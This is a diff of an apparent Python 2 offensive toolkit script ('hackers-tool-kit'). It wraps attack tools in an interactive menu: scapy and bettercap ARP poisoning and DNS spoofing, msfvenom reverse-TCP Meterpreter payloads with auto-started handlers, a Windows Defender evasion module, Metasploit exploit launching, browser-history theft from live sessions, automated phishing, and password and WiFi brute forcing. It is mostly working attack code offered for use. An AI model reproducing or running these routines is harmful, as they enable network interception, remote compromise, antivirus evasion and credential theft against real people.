-		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
-		for snd,rcv in ans:
-		        return rcv.sprintf(r"%Ether.src%")
-	 
-	def reARP():
-	       
-		print "\n[*] Restoring Targets..."
-		victimMAC = get_mac(victimIP)
-		gateMAC = get_mac(gateIP)
-		send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
-		send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
-		print "[*] Disabling IP Forwarding..."
-		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-		print "[*] Shutting Down..."
-		os.system("clear")
-		mainbanner()
-	 
-	def trick(gm, vm):
-		send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
-		send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
-	 
-	def mitm():
-		try:
-		        victimMAC = get_mac(victimIP)
-		except Exception:
-		        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
-		        print "[!] Couldn't Find Victim MAC Address"
-		        print "[!] Exiting..."
-			os.system("clear")
-			mainbanner()
-		try:
-		        gateMAC = get_mac(gateIP)
-		except Exception:
-		        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
-		        print "[!] Couldn't Find Gateway MAC Address"
-		        print "[!] Exiting..."
-			os.system("clear")
-			mainbanner()
-		print "[*] Poisoning Targets..."       
-		while 1:
-		        try:
-		                trick(gateMAC, victimMAC)
-		                time.sleep(1.5)
-		        except KeyboardInterrupt:
-		                reARP()
-		                break
-	mitm()
+#-------------------#
+#MAC CHANGER OFF END#
+
+
+#ARP SPOOF START#
+#---------------#
+def arpspoof():
+	print "\033[93mif using multiple targets heres an example:	134.143.1.3, 134.143.1.6\033[0m\n"
+	h = raw_input("Targets: ")
+	os.system('echo "net.sniff on\n" >> arp.cap')
+	os.system('echo "set arp.spoof.targets {0}\n" >> arp.cap'.format(h))
+	os.system('echo "arp.spoof on\n" >> arp.cap')
+	print '\n\033[93mto stop type "exit"\033[0m'
+	os.system("sleep 2")
+	os.system("bettercap -no-history -caplet arp.cap")
+	os.system("rm arp.cap")
+#-------------#
+#ARP SPOOF END#
+
+
+#SSL SCAN START#
+#--------------#
 def sslscan():
 	j = raw_input('Enter Target: ')
 	a = 'sslscan {0}'.format(j)
 	os.system(a)
+#------------#
+#SSL SCAN END#
+
+
+#MAKE A PAYLOAD START#
+#--------------------#
 def payload():
 	os.system("cat /root/hackers-tool-kit/tools/payloads.txt")
 	print "\n"
 	f = raw_input("Select Payload: ")
 	l = raw_input("LHOST: ")
 	c = raw_input("LPORT: ")
-	os.system("cat /root/hackers-tool-kit/tools/formats.txt")
-	s = raw_input("Format: ")
+	print "\nExamples: py, php, exe\n"
+	s = raw_input("File Format: ")
 	h = raw_input("File Name: ")
-	a = 'msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o /root/{4}.{5}'.format(f,l,c,s,h,s)
+	a = 'msfvenom -p {0} LHOST={1} LPORT={2} -o /root/{3}.{4}'.format(f,l,c,h,s)
 	os.system(a)
+#------------------#
+#MAKE A PAYLOAD END#
+
+
+#WORDLIST MAKER START#
+#--------------------#
 def crunch():
 	print "minimal number of characters"	
 	j = raw_input("[CRUNCH]: ")
@@ -1131,10 +2162,22 @@ def crunch():
 	a = 'crunch {0} {1} {2} -o /root/hackers-tool-kit/wordlists/{3}'.format(j,k,b,s)
 	os.system(a)
 	print Y+"wordlist saved to \033[0m/root/hackers-tool-kit/wordlists/" + s
+#------------------#
+#WORDLIST MAKER END#
+
+
+#INTERNET TRAFFIC START#
+#----------------------#
 def traff():
 	os.system("iwconfig")
 	s = raw_input("Select Interface: ")
 	os.system("tcpdump -i " + s)
+#--------------------#
+#INTERNET TRAFFIC END#
+
+
+#RESET ACCOUNT PASSWORD START#
+#----------------------------#
 def resa():
 	j = raw_input("USERNAME: ")
 	k = raw_input("NEW PASSWORD: ")
@@ -1146,6 +2189,12 @@ def resa():
 	if q == "y":
 		a = 'echo "{0}:{1}" | chpasswd'.format(j,k)
 		print "password for {0} has been reset".format(j)
+#--------------------------#
+#RESET ACCOUNT PASSWORD END#
+
+
+#RESET UNIX PASSWORD START#
+#-------------------------#
 def resu():
 	j = raw_input("PASSWORD: ")
 	print "are you sure?"
@@ -1156,6 +2205,12 @@ def resu():
 	if q == "y":
 		a = 'passwd {0}'.format(j)
 		print "unix password has been reset".format(j)
+#-----------------------#
+#RESET UNIX PASSWORD END#
+
+
+#FIND HASH TYPE START#
+#--------------------#
 def hashid():
 	#!/usr/bin/python
 	# encoding: utf-8
@@ -1734,9 +2789,21 @@ def hashid():
 		print "Possible Hashs:"
 		for a in range(len(jerar)):
 		    print "[+] ",algorithms[jerar[a]]
+#------------------#
+#FIND HASH TYPE END#
+
+
+#RESTART SCRIPT START#
+#--------------------#
 def restart():
 	os.system("clear")
 	os.system("cd /root/hackers-tool-kit && python htk.py")
+#------------------#
+#RESTART SCRIPT END#
+
+
+#MEDUSA AUTOMATED START#
+#----------------------#
 def medusa():
 	k = raw_input("Target Host: ")
 	u = raw_input("User: ")
@@ -1747,10 +2814,22 @@ def medusa():
 	n = raw_input("Port: ")
 	a = 'medusa -h {0} -u {1} -P {2} -M {3} -n {4}'.format(k,u,p,m,n)
 	os.system(a)
+#--------------------#
+#MEDUSA AUTOMATED END#
+
+
+#WAF DETECTER START#
+#------------------#
 def wafwoof():
 	j = raw_input("Enter Target: ")
 	k = 'wafw00f {0}'.format(j)
 	os.system(k)
+#----------------#
+#WAF DETECTER END#
+
+
+#CLOUDFLARE BYPASS START#
+#-----------------------#
 def cloud():
 
 	subdomainlist = ["ftp", "cpanel", "webmail" , "mail" , "www", "www1", "www2", "www3", "www4", "www5","ns1", "ns2" , "forums" , "blog"]
@@ -1767,189 +2846,657 @@ def cloud():
 		    	pass
 
 	print ( '\033[93m' + "Credit Goes To: tugrulbey.com")
-	print ( '\033[92m' + "Credit Goes To: tztugrulbey@protonmail.com") 
+	print ( '\033[92m' + "Credit Goes To: tztugrulbey@protonmail.com")
+#---------------------#
+#CLOUDFLARE BYPASS END#
+
+
+#BRUTEFORCE ALL SERVICES ON WEB START#
+#------------------------------------# 
 def brutex():
 	k = raw_input("Target: ")
 	p = raw_input("Port: ")
 	a = 'brutex {0} {1}'.format(k,p)
 	os.system(a)
+#----------------------------------#
+#BRUTEFORCE ALL SERVICES ON WEB END#
+
+
+#METERPRETER HELP MENU START#
+#---------------------------#
 def methelp():
 	os.system("cat /root/hackers-tool-kit/tools/meterpreter.txt")
+#-------------------------#
+#METERPRETER HELP MENU END#
+
+
+#WINDOWS DEFENDER BYPASS START#
+#-----------------------------#
 def winbyp():
 	os.system("cat /root/hackers-tool-kit/tools/payloads.txt")
 	pay = raw_input("Payload: ")
 	port = raw_input("Port: ")
 	name = raw_input("File Name: ")
-	os.system('echo "use evasion/windows/windows_defender_exe\n" > handler.rc')
-	os.system('echo "set payload {0}\n" >> handler.rc'.format(pay))
-	os.system('echo "set LHOST 127.0.0.1\n" >> handler.rc')
-	os.system('echo "set LPORT {0}\n" >> handler.rc'.format(port))
-	os.system('echo "set filename {0}.exe\n" >> handler.rc'.format(name))
-	os.system('echo "run\n" >> handler.rc')
+	os.system('echo "use evasion/windows/windows_defender_exe\n" > winbyp.rc')
+	os.system('echo "set payload {0}\n" >> winbyp.rc'.format(pay))
+	os.system('echo "set LHOST 127.0.0.1\n" >> winbyp.rc')
+	os.system('echo "set LPORT {0}\n" >> winbyp.rc'.format(port))
+	os.system('echo "set filename {0}.exe\n" >> winbyp.rc'.format(name))
+	os.system('echo "run\n" >> winbyp.rc')
 	os.system("service postgresql restart")
-	os.system('msfconsole -r handler.rc')
-	os.system('rm -rf handler.rc')
+	os.system('msfconsole -r winbyp.rc')
+	os.system('rm -rf winbyp.rc')
+#---------------------------#
+#WINDOWS DEFENDER BYPASS END#
+
+
+#USE A EXPLOIT START#
+#-------------------#
 def exploit():
 	os.system("cat /root/hackers-tool-kit/tools/exploits.txt")
 	print "\n"
 	f = raw_input("Select Exploit: ")
-	os.system('echo "use {0}\n" >> handler.rc'.format(f))
-	os.system('echo "show options\n" >> handler.rc'.format(f))
+	os.system('echo "use {0}\n" >> exploit.rc'.format(f))
+	os.system('echo "show options\n" >> exploit.rc'.format(f))
 	os.system("service postgresql restart")
-	os.system('msfconsole -r handler.rc')
-	os.system('rm -rf handler.rc')
+	os.system('msfconsole -r exploit.rc')
+	os.system('rm -rf exploit.rc')
+#-----------------#
+#USE A EXPLOIT END#
+
+
+#PHISHING AUTOMATED START#
+#------------------------#
 def phish():
 	os.system("bash /root/shellphish/shellphish.sh")
+#----------------------#
+#PHISHING AUTOMATED END#
+
+
+#LIST DATABASE INFO START#
+#------------------------#
 def datalist():
-	os.system('echo "hosts\n" >> handler.rc')
-	os.system('echo "services\n" >> handler.rc')
+	os.system('echo "hosts\n" >> data.rc')
+	os.system('echo "services\n" >> data.rc')
 	os.system("service postgresql restart")
-	os.system('msfconsole -r handler.rc')
-	os.system('rm -rf handler.rc')	
+	os.system('msfconsole -r data.rc')
+	os.system('rm -rf data.rc')
+#----------------------#
+#LIST DATABASE INFO END#
+
+
+#ALL METASPLOIT EVASIONS START#
+#-----------------------------#
+def msfev():
+	os.system("service postgresql start")
+	os.system("""msfconsole -x 'show evasion'""")
+#---------------------------#
+#ALL METASPLOIT EVASIONS END#
+
+
+#FULLY UPDATE YOUR OS START#
+#--------------------------#
+def upgrade():
+	os.system("apt update && apt upgrade")
+#------------------------#
+#FULLY UPDATE YOUR OS END#
+
+
+#USE A NMAP SCRIPT START#
+#-----------------------#
+def nscript():
+	os.system("cat /root/hackers-tool-kit/tools/scripts.txt")
+	print "\n"
+	j = raw_input(G+"Select Script:\033[0m ")
+	k = raw_input(G+"Target:\033[0m ")
+	a = 'nmap --script {0} {1}'.format(j,k)
+	os.system(a)
+#---------------------#
+#USE A NMAP SCRIPT END#
+
+
+#GET HOST SSH VERSION START#
+#--------------------------#
+def sshver():
+	f = raw_input(G+"Target: \033[0m")
+	g = raw_input(G+"Port: \033[0m")
+	t = raw_input(G+"Threads: \033[0m")
+	b = raw_input(G+"Timeout: \033[0m")
+	os.system('echo "use auxiliary/scanner/ssh/ssh_version\n" >> sshver.rc')
+	os.system('echo "set RHOSTS {0}\n" >> sshver.rc'.format(f))
+	os.system('echo "set RPORT {0}\n" >> sshver.rc'.format(g))
+	os.system('echo "set THREADS {0}\n" >> sshver.rc'.format(t))
+	os.system('echo "set TIMEOUT {0}\n" >> sshver.rc'.format(b))
+	os.system('echo "show options\n" >> sshver.rc')
+	os.system('echo "run\n" >> sshver.rc')
+	os.system("service postgresql restart")
+	os.system('msfconsole -r sshver.rc')
+	os.system('rm -rf sshver.rc')
+#------------------------#
+#GET HOST SSH VERSION END#
+
+
+#USE PROXYCHAINS FOR WEB START#
+#-----------------------------#
+def chains():
+	h = raw_input("Enter Browser: ")
+	j = raw_input("Enter Website: ")
+	a = 'proxychains {0} {1}'.format(h,j)
+	os.system(a)
+#---------------------------#
+#USE PROXYCHAINS FOR WEB END#
+
+
+#GET HOST MYSQL VERSION START#
+#----------------------------#
+def mysqlv():
+	f = raw_input(G+"Target: \033[0m")
+	g = raw_input(G+"Port: \033[0m")
+	t = raw_input(G+"Threads: \033[0m")
+	os.system('echo "use auxiliary/scanner/mysql/mysql_version\n" >> mysqlv.rc')
+	os.system('echo "set RHOSTS {0}\n" >> mysqlv.rc'.format(f))
+	os.system('echo "set RPORT {0}\n" >> mysqlv.rc'.format(g))
+	os.system('echo "set THREADS {0}\n" >> mysqlv.rc'.format(t))
+	os.system('echo "show options\n" >> mysqlv.rc')
+	os.system('echo "run\n" >> mysqlv.rc')
+	os.system("service postgresql restart")
+	os.system('msfconsole -r mysqlv.rc')
+	os.system('rm -rf mysqlv.rc')
+#--------------------------#
+#GET HOST MYSQL VERSION END#
+
+
+#CONNECT TO A HOST START#
+#-----------------------#
+def connect():
+        h = raw_input("Enter Host: ")
+	print "\n"
+	print "    How would you like to connect?"
+	print "---------------------------------------"
+	print "ssh:          Secure Shell            | Default Port = 22"
+	print "---------------------------------------"
+	print "telnet:  Network Virtual Terminal     | Default Port = 23"
+	print "---------------------------------------"
+	j = raw_input("Select Protocol: ")
+	a = '{0} {1}'.format(j,h)
+	os.system(a)
+#---------------------#
+#CONNECT TO A HOST END#
+
+
+
+#OPEN NEW TERMINAL START#
+#-----------------------#
+def terminal():
+	os.system("gnome-terminal")
+#---------------------#
+#OPEN NEW TERMINAL END#
+
+
+#AIRCRACK-NG [WIFI HACK] AUTOMATED START#
+#---------------------------------------#
+def aircrack():
+	b = raw_input(G+"BSSID: \033[0m")
+	e = raw_input(G+"ESSID: \033[0m")
+	w = raw_input(G+"Wordlist: \033[0m")
+	h = raw_input(G+"Handshake file: \033[0m")
+	os.system("iwconfig")
+	i = raw_input(G+"Interface: \033[0m")
+	a = 'aircrack-ng -b {0} -e {1} -w {2} {3} {4}'
+	os.system(a)
+#-------------------------------------#
+#AIRCRACK-NG [WIFI HACK] AUTOMATED END#
+
+
+#GET SOURCE CODE OF WEB START#
+#----------------------------#
+def source():
+	t = raw_input(B+"Target:\033[0m ")
+	print Y+"\nWould you like to save source code in a file?\n\033[0m"
+	q = raw_input(R+"[y/n]:\033[0m ")
+	if q == "n":
+		an = 'curl {0}'.format(t)
+		os.system(an)
+	if q == "y":
+		ay = 'curl {0} >> /root/{1}.txt'.format(t,t)
+		os.system(ay)
+		print Y+"\nfile saved > /root/{0}.txt\033[0m".format(t) 
+#--------------------------#
+#GET SOURCE CODE OF WEB END#
+
+
+#WEB DIRECTORY SCAN START#
+#------------------------#
+def dirscan():
+	t = raw_input(B+"Target URL:\033[91m ")
+	print "\033[0m"
+	a = 'dirb {0}'.format(t)
+	os.system(a)
+#----------------------#
+#WEB DIRECTORY SCAN END#
+
+
+
+#APACHE SERVER START#
+#-------------------#
+def aserver():
+	gw = os.popen("ip -4 route show default").read().split()
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	s.connect((gw[2], 0))
+	ipaddr = s.getsockname()[0]
+	print Y+"Starting Server\033[0m..."
+	os.system("service apache2 start")
+	br = raw_input(G+"Browser: \033[0m")
+	a = '{0} {1}'.format(br,ipaddr)
+	os.system(a)
+	stop = raw_input("hit enter to stop server: ")
+	print Y+"Stopping Server\033[0m..."
+	os.system("service apache2 stop")
+#-----------------#
+#APACHE SERVER END#
+
+
+#RUN A FILE START#
+#----------------#
+def run():
+	print Y+"what program do you want to run the file with    Example: python"
+	p = raw_input(N+"Program: ")
+	print "\n"
+	print Y+"Example 1: /root/hi/hello.py/     \033[94mExample 2: hello.py\033[0m"
+	print "\n"
+	f = raw_input("Enter File: ")
+	print "\n"
+	print Y+"would you like to add arguments when running the file  [y/n]\033[0m"
+	yn = raw_input(G+"[y or n]: \033[0m")
+	if yn == "n" :
+		a = '{0} {1}'.format(p,f)
+		os.system(a)
+	if yn == "y" :
+		arg = raw_input("Enter Arguments: ")
+		a = '{0} {1} {2}'.format(p,f,arg)
+		os.system(a)
+#--------------#
+#RUN A FILE END#
+
+
+#REFRESH BANNER START#
+#--------------------#
+def banner():
+	os.system("clear")
+	mainbanner()
+#------------------#
+#REFRESH BANNER END#
+
+
+#PHP PAYLOAD START#
+#-----------------#
+def phpload():
+	lhost = raw_input("LHOST: ")
+	lport = raw_input("LPORT: ")
+	filen = raw_input("File Name: ")
+	a = 'msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.php'.format(lhost,lport,filen)
+	os.system(a)
+	print "\nwould you like to run this file in a multi handler?"
+	yn = raw_input("[y/n]> ")
+	if yn == "y":
+		os.system('echo "use exploit/multi/handler\n" >> phpload.rc')
+		os.system('echo "set payload php/meterpreter/reverse_tcp\n" >> phpload.rc')
+		os.system('echo "set LHOST {0}\n" >> phpload.rc'.format(lhost))
+		os.system('echo "set LPORT {0}\n" >> phpload.rc'.format(lport))
+		os.system('echo "exploit\n" >> phpload.rc')
+		os.system("service postgresql restart")
+		os.system('msfconsole -r phpload.rc')
+		os.system('rm -rf phpload.rc')
+	if yn == "n":
+		os.system('echo " "')
+#---------------#
+#PHP PAYLOAD END#
+
+
+#PYLOAD START#
+#------------#
+def pyload():
+	lhost = raw_input("LHOST: ")
+	lport = raw_input("LPORT: ")
+	filen = raw_input("File Name: ")
+	a = 'msfvenom -p python/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.py'.format(lhost,lport,filen)
+	os.system(a)
+	print "\nwould you like to run this file in a multi handler?"
+	yn = raw_input("[y/n]> ")
+	if yn == "y":
+		os.system('echo "use exploit/multi/handler\n" >> pyload.rc')
+		os.system('echo "set payload python/meterpreter/reverse_tcp\n" >> pyload.rc')
+		os.system('echo "set LHOST {0}\n" >> pyload.rc'.format(lhost))
+		os.system('echo "set LPORT {0}\n" >> pyload.rc'.format(lport))
+		os.system('echo "exploit\n" >> pyload.rc')
+		os.system("service postgresql restart")
+		os.system('msfconsole -r pyload.rc')
+		os.system('rm -rf pyload.rc')
+	if yn == "n":
+		os.system('echo " "')
+#----------#
+#PYLOAD END#
+
+
+#FOXHIS START#
+#------------#
+def foxhis():
+	os.system('echo "sessions\n" >> foxhisses.rc')
+	os.system('echo "exit\n" >> foxhisses.rc')
+	os.system("service postgresql restart")
+	os.system('msfconsole -q -r foxhisses.rc')
+	os.system('rm -rf foxhisses.rc')
+	print "\n"
+	ses = raw_input("Session: ")
+	print "\nMaximum time (seconds) to wait for a response\n"
+	time = raw_input("Timeout: ")
+	os.system('echo "use firefox/gather/history\n" >> foxhis.rc')
+	os.system('echo "set session {0}\n" >> foxhis.rc'.format(ses))
+	os.system('echo "set timeout {0}\n" >> foxhis.rc'.format(time))
+	os.system('echo "run\n" >> foxhis.rc')
+	os.system('msfconsole -q -r foxhis.rc')
+	os.system('rm -fr foxhis.rc')
+#----------#
+#FOXHIS END#
+
+
+#RHAWK START#
+#-----------#
+def rhawk():
+	os.system("cd /root/hackers-tool-kit/redhawk/ && php rhawk.php")
+#---------#
+#RHAWK END#
+
+
+#NANO START#
+#----------#
+def nano():
+	print "opening nano in \033[93m/root/\033[0m folder"
+	os.system("sleep 2")
+	os.system("cd /root/ && nano")
+#--------#
+#NANO END#
+
+
+#UPDATE HACKERS-TOOL-KIT START#
+#-----------------------------#
+def update():
+	os.system("cd /root/hackers-tool-kit/ && python htkupdate.py")
+#---------------------------#
+#UPDATE HACKERS-TOOL-KIT END#
+
+#COMPILE C START#
+#---------------#
+def compilec():
+	print "filename / filepath"
+	r = raw_input("> ")
+	print "\nfilename2 / filepath2"
+	h = raw_input("> ")
+
+	a = 'g++ {0} -o {1}'.format(r,h)
+	os.system(a)
+#COMPILE C END#
+#-------------#
+
+#DNS SPOOF START#
+#---------------#
+def dnsspoof():
+	target = raw_input("\033[1mTarget:\033[0m ")
+	domain1 = raw_input("\033[1mDomain1:\033[0m ")
+	domain2 = raw_input("\033[1mDomain2:\033[0m ")
+	os.system('echo "net.sniff on\n" >> dns.cap')
+	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dns.cap'.format(domain1,domain2))
+	os.system('echo "set dns.spoof.address {0}\n" >> dns.cap'.format(target))
+	os.system('echo "dns.spoof on\n" >> dns.cap')
+	print '\n\033[93mto stop type "exit"\033[0m'
+	os.system("sleep 2")
+	os.system("bettercap -no-history -caplet dns.cap")
+	os.system("rm dns.cap")
+
+def dnsspoofall():
+	domain1 = raw_input("\033[1mDomain1:\033[0m ")
+	domain2 = raw_input("\033[1mDomain2:\033[0m ")
+	os.system('echo "net.sniff on\n" >> dnsall.cap')
+	os.system('echo "set dns.spoof.domains {0},{1}\n" >> dnsall.cap'.format(domain1,domain2))
+	os.system('echo "set dns.spoof.all true\n" >> dnsall.cap')
+	os.system('echo "dns.spoof on\n" >> dnsall.cap')
+	print '\n\033[93mto stop type "exit"\033[0m'
+	os.system("sleep 2")
+	os.system("bettercap -no-history -caplet dnsall.cap")
+	os.system("rm dnsall.cap")
+
+
+#-------------#
+#DNS SPOOF END#
+
+
+#REBOOT HTK START#
+#----------#
+def reboot():
+	python = sys.executable
+	os.execl(python, python, * sys.argv)
+	curdir = os.getcwd()
+#--------------#
+#REBOOT HTK END#
+
+
+#THIS IS THE MAIN PART OF THE SCRIPT LIKE WHERE YOU TYPE WHERE IT RUNS THE COMMANDS SHIT LIKE THAT#
+#-------------------------------------------------------------------------------------------------#
 def main():
 	found = False
 	while not found:
-		x = raw_input(N+'\033[91m[\033[0mhtk\033[91m]\033[94m->\033[92m: \033[0m')
-		if x == "?":
-			help()
-		if x == "winload" :
-			winload()
-		if x == "clear" :
-			os.system("clear")
-			mainbanner()
-		if x == "andload":
-			andload()
-		if x == "command":
-			c = raw_input("Command: ")
-			os.system(c)
-		if x == "msfcon" :
-			os.system("service postgresql start")
-			os.system("msfconsole")
-		if x == "set":
-			os.system("setoolkit")
-		if x == "msfven":
-			print R+"!ONLY TYPE THE ARGUMENTS DONT TYPE MSFVENOM\033[0m"
-			v = raw_input(G+"MSFVENOM: \033[0m")
-			os.system("msfvenom", v)
-		if x == "gmail" :
-			gmail()
-		if x == "insta":
-			insta()
-		if x == "fb" :
-			fb()
-		if x == "ipgrab":
-			ipgrab()
-		if x == "myip":
-			myip()
-		if x == "wifite":
-			wifite()
-		if x == "mon" :
-			mon()
-		if x == "netdev" :
-			netdev()
-		if x == "scannet":
-			scannet()
-		if x == "exit" :
-			import sys
-			print "follow \033[92m@unkn0wn_bali\033[0m on instagram"
-			sys.exit()
-		if x == "rebootl":
-			print R+"! ARE YOU SURE YOU WANT TO REBOOT YOUR WHOLE DEVICE !\033[0m"
-			c = raw_input("[y/n]> ")
-			if c == "y" :
-				os.system("reboot")
-			if c == "n" :
+		try:
+			x = raw_input(N+'\033[91m[\033[0mh-\033[94mT\033[0m-k\033[91m]\033[94m->\033[92m: \033[0m')
+			if x == "?":
+				help()
+			if x == "winload" :
+				winload()
+			if x == "clear" :
 				os.system("clear")
-				mainbanner()
-				main()
-		if x == "port":
-			port()
-		if x == "info":
-			info()
-		if x == "sysinfo":
-			sysinfo()
-		if x == "msfex":
-			msfex()
-		if x == "udp":
-			udp()
-		if x == "tcp":
-			tcp()
-		if x == "syn":
-			syn()
-		if x == "msfpa":
-			msfpa()
-		if x == "msfau":
-			msfau()
-		if x == "ping" :
-			ping()
-		if x == "multih":
-			multih()
-		if x == "msfall":
-			msfall()
-		if x == "hydra" :
-			hydra()
-		if x == "cupp":
-			cupp()
-		if x == "vdir":
-			vdir()
-		if x == "monoff":
-			monoff()
-		if x == "vpn":
-			vpn()
-		if x == "vpnoff":
-			vpnoff()
-		if x == "slowl":
-			slowl()
-		if x == "pidox":
-			pidox()
-		if x == "specnet":
-			specnet()
-		if x == "pingen":
-			pingen()
-		if x == "reaver":
-			reaver()
-		if x == "deauth":
-			deauth()
-		if x == "macc":
-			macc()
-		if x == "macoff":
-			macoff()
-		if x == "arppois":
-			appois()
-		if x == "sslscan":
-			sslscan()
-		if x == "payload":
-			payload()
-		if x == "crunch":
-			crunch()
-		if x == "traff":
-			traff()
-		if x == "resa":
-			resa()
-		if x == "resu":
-			resu()
-		if x == "hashid":
-			hashid()
-		if x == "restart":
-			restart()
-		if x == "medusa":
-			medusa()
-		if x == "wafwoof":
-			wafwoof()
-		if x == "cloud":
-			cloud()
-		if x == "brutex":
-			brutex()
-		if x == "methelp":
-			methelp()
-		if x == "winbyp":
-			winbyp()
-		if x == "exploit":
-			exploit()
-		if x == "phish":
-			phish()
-		if x == "datalist":
-			datalist()
+			if x == "andload":
+				andload()
+			if x == "command":
+				c = raw_input("Command: ")
+				os.system(c)
+			if x == "msfcon" :
+				os.system("service postgresql start")
+				os.system("msfconsole")
+			if x == "set":
+				os.system("setoolkit")
+			if x == "msfven":
+				print R+"!ONLY TYPE THE ARGUMENTS DONT TYPE MSFVENOM\033[0m"
+				v = raw_input(G+"MSFVENOM: \033[0m")
+				os.system("msfvenom", v)
+			if x == "gmail" :
+				gmail()
+			if x == "insta":
+				insta()
+			if x == "fb" :
+				fb()
+			if x == "ipgrab":
+				ipgrab()
+			if x == "myip":
+				myip()
+			if x == "wifite":
+				wifite()
+			if x == "mon" :
+				mon()
+			if x == "netdev" :
+				netdev()
+			if x == "scannet":
+				scannet()
+			if x == "exit":
+				print "\nfollow @tuf_unkn0wn on instagram"
+				print "\nExiting..."
+				break
+				os.system("service tor stop")
+				os.system("service postgresql stop")
+				sys.exit()
+			if x == "rebootl":
+				print R+"! ARE YOU SURE YOU WANT TO REBOOT YOUR WHOLE DEVICE !\033[0m"
+				c = raw_input("[y/n]> ")
+				if c == "y" :
+					os.system("reboot")
+				if c == "n" :
+					os.system("clear")
+					mainbanner()
+					main()
+			if x == "port":
+				port()
+			if x == "info":
+				info()
+			if x == "sysinfo":
+				sysinfo()
+			if x == "msfex":
+				msfex()
+			if x == "udp":
+				udp()
+			if x == "tcp":
+				tcp()
+			if x == "syn":
+				syn()
+			if x == "msfpa":
+				msfpa()
+			if x == "msfau":
+				msfau()
+			if x == "ping" :
+				ping()
+			if x == "multih":
+				multih()
+			if x == "msfall":
+				msfall()
+			if x == "hydra" :
+				hydra()
+			if x == "cupp":
+				cupp()
+			if x == "vdir":
+				vdir()
+			if x == "monoff":
+				monoff()
+			if x == "vpn":
+				vpn()
+			if x == "vpnoff":
+				vpnoff()
+			if x == "slowl":
+				slowl()
+			if x == "pidox":
+				pidox()
+			if x == "specnet":
+				specnet()
+			if x == "pingen":
+				pingen()
+			if x == "reaver":
+				reaver()
+			if x == "deauth":
+				deauth()
+			if x == "macc":
+				macc()
+			if x == "macoff":
+				macoff()
+			if x == "arpspoof":
+				arpspoof()
+			if x == "sslscan":
+				sslscan()
+			if x == "payload":
+				payload()
+			if x == "crunch":
+				crunch()
+			if x == "traff":
+				traff()
+			if x == "resa":
+				resa()
+			if x == "resu":
+				resu()
+			if x == "hashid":
+				hashid()
+			if x == "restart":
+				restart()
+			if x == "medusa":
+				medusa()
+			if x == "wafwoof":
+				wafwoof()
+			if x == "cloud":
+				cloud()
+			if x == "brutex":
+				brutex()
+			if x == "methelp":
+				methelp()
+			if x == "winbyp":
+				winbyp()
+			if x == "exploit":
+				exploit()
+			if x == "phish":
+				phish()
+			if x == "datalist":
+				datalist()
+			if x == "msfev":
+				msfev()
+			if x == "upgrade":
+				upgrade()
+			if x == "nscript":
+				nscript()
+			if x == "sshver":
+				sshver()
+			if x == "chains":
+				chains()
+			if x == "mysqlv":
+				mysqlv()
+			if x == "connect":
+				connect()
+			if x == "terminal":
+				terminal()
+			if x == "aircrack":
+				aircrack()
+			if x == "source":
+				source()
+			if x == "dirscan":
+				dirscan()
+			if x == "aserver":
+				aserver()
+			if x == "clearall":
+				clearall()
+			if x == "run":
+				run()
+			if x == "banner":
+				banner()
+			if x == "phpload":
+				phpload()
+			if x == "pyload":
+				pyload()
+			if x == "foxhis":
+				foxhis()
+			if x == "rhawk":
+				rhawk()
+			if x == "nano":
+				nano()
+			if x == "update":
+				update()
+			if x == "compilec":
+				compilec()
+			if x == "dnsspoof":
+				dnsspoof()
+			if x == "dnsspoofall":
+				dnsspoofall()
+			if x == "htk-lite":
+				os.system("python /root/hackers-tool-kit/htk-lite/htkl.py")
+			if x == "reboot":
+				reboot()
+			if x == "specscan":
+				specscan()
+			if x == "anon on":
+				anonon()
+			if x == "anon off":
+				anonoff()
+
+		except:
+			print "\nfollow @tuf_unkn0wn on instagram"
+			print "\nExiting..."
+			break
+			os.system("service tor stop")
+			os.system("service postgresql stop")
 	found = True
+
 mainbanner()
 main()
+#-------------------------------------------------------------------------------------------------#
+#THIS IS THE MAIN PART OF THE SCRIPT LIKE WHERE YOU TYPE WHERE IT RUNS THE COMMANDS SHIT LIKE THAT#
